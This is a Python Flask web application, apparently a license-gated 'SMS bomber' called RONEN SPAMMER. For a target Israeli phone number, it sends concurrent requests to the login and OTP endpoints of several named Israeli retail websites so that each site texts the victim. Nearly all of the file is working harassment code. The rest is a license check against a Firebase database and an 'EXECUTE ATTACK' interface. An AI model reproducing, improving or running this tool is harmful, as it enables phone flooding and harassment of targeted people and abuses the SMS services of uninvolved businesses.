from flask import Flask, request, jsonify, render_template_string
import requests
import time
import random
import string
import uuid
import re
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

app = Flask(__name__)

# --- Config & Firebase ---
BASE_URL = "https://ronen-spammer-6b075-default-rtdb.europe-west1.firebasedatabase.app/"
DB_URL = f"{BASE_URL}keys.json"

# --- Validation Functions ---
def is_valid_israeli_phone(phone: str) -> bool:
    phone = phone.strip().replace(" ", "").replace("-", "")
    if phone.startswith("+972"): phone = "0" + phone[4:]
    elif phone.startswith("972"): phone = "0" + phone[3:]
    pattern = r'^05\d{8}$'
    return bool(re.match(pattern, phone))

def check_license(key):
    try:
        r = requests.get(DB_URL, timeout=5)
        data = r.json() or {}
        if key in data:
            exp = data[key].get("expiry")
            if exp == "never": return True, "Lifetime"
            dt = datetime.strptime(exp, "%Y-%m-%d")
            if (dt - datetime.now()).days >= -1:
                return True, exp
        return False, "Invalid/Expired"
    except: return False, "Server Error"

# --- Attack Logic (Engines) ---
def fire_magento_v3(url, name, phone):
    try:
        sess = requests.Session()
        sess.headers.update({"User-Agent": "Mozilla/5.0", "X-Requested-With": "XMLHttpRequest"})
        sess.get(url.split("customer")[0], timeout=5)
        data = {"form_key": "Ey4knrSRwDvWaGdz", "telephone": phone, "type": "login", "bot_validation": "1"}
        r = sess.post(url, data=data, timeout=8)
        return f"[+] {name} Sent" if r.status_code in (200, 201) else None
    except: return None

def fire_fox_group(url, name, phone):
    try:
        h = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
        r = requests.post(url, json={"phoneNumber": phone, "uuid": str(uuid.uuid4())}, headers=h, timeout=6)
        return f"[+] {name} Sent" if r.status_code in (200, 201) else None
    except: return None

def run_full_attack(phone):
    magento_list = [
        ("https://www.intima-il.co.il/customer/ajax/post/", "Intima"),
        ("https://www.crazyline.com/customer/ajax/post/", "CrazyLine"),
        ("https://www.golfkids.co.il/customer/ajax/post/", "GolfKids"),
        ("https://www.kikocosmetics.co.il/customer/ajax/post/", "Kiko"),
        ("https://www.fixfixfixfix.co.il/customer/ajax/post/", "FIX"),
        ("https://www.castro.com/customer/ajax/post/", "Castro"),
        ("https://www.hoodies.co.il/customer/ajax/post/", "Hoodies")
    ]
    fox_list = [
        ("https://fox.co.il/apps/dream-card/api/proxy/otp/send", "Fox"),
        ("https://www.laline.co.il/apps/dream-card/api/proxy/otp/send", "LaLine")
    ]
    
    with ThreadPoolExecutor(max_workers=20) as ex:
        tasks = [ex.submit(fire_magento_v3, u, n, phone) for u, n in magento_list]
        tasks += [ex.submit(fire_fox_group, u, n, phone) for u, n in fox_list]
        for _ in as_completed(tasks): pass

# --- Routes ---
@app.route('/')
def index():
    return render_template_string("""
    <!DOCTYPE html>
    <html>
    <head>
        <title>RONEN SPAMMER WEB</title>
        <style>
            body { background-color: #0a0a0a; color: #ff0000; font-family: 'Courier New', Courier, monospace; text-align: center; padding: 50px; }
            .box { border: 2px solid #ff0000; padding: 30px; display: inline-block; box-shadow: 0 0 15px #ff0000; }
            input { background: #000; color: #fff; border: 1px solid #ff0000; padding: 10px; margin: 10px; width: 250px; outline: none; }
            button { background: #ff0000; color: #000; border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; transition: 0.3s; }
            button:hover { background: #fff; color: #ff0000; }
            #logs { margin-top: 20px; font-size: 12px; color: #fff; }
        </style>
    </head>
    <body>
        <div class="box">
            <h1>RONEN SPAMMER</h1>
            <p>MADE BY RoNen</p>
            <input type="text" id="key" placeholder="LICENSE KEY"><br>
            <input type="text" id="phone" placeholder="TARGET PHONE (05XXXXXXXX)"><br>
            <button onclick="start()">EXECUTE ATTACK</button>
            <div id="logs">Ready to strike...</div>
        </div>

        <script>
            function start() {
                const key = document.getElementById('key').value;
                const phone = document.getElementById('phone').value;
                const log = document.getElementById('logs');
                log.innerText = "Validating Access...";
                
                fetch('/api/strike', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({key: key, phone: phone})
                })
                .then(response => response.json())
                .then(data => {
                    log.innerText = data.status === "success" ? "ATTACK STARTED!" : "ERROR: " + data.message;
                });
            }
        </script>
    </body>
    </html>
    """)

@app.route('/api/strike', methods=['POST'])
def api_strike():
    data = request.json
    key = data.get('key')
    phone = data.get('phone')

    ok, status = check_license(key)
    if not ok:
        return jsonify({"status": "error", "message": "Invalid License Key"}), 403
    
    if not is_valid_israeli_phone(phone):
        return jsonify({"status": "error", "message": "Invalid Phone Format"}), 400

    # הפעלה בשרשור נפרד כדי לא לתקוע את ה-Response
    threading.Thread(target=run_full_attack, args=(phone,)).start()
    
    return jsonify({"status": "success", "message": "Attack sent to queue"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)